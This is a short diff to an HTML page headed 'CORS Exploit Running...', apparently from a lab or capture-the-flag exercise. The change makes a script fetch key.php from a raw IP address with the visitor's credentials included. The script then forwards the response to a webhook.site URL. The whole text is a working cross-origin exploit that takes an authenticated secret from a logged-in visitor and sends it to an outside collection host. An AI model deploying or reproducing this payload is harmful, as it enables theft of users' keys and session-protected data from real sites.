@@ -6,7 +6,9 @@
 <body>
   <h1>CORS Exploit Running...</h1>
   <script>
-    fetch("http://34.126.93.33/key.php")
+    fetch("http://34.126.93.33/key.php", {
+      credentials: "include"
+    })
     .then(res => res.text())
     .then(data => {
       fetch("https://webhook.site/b7423942-9f41-412d-9709-593fabe33f64/" + encodeURIComponent(data));
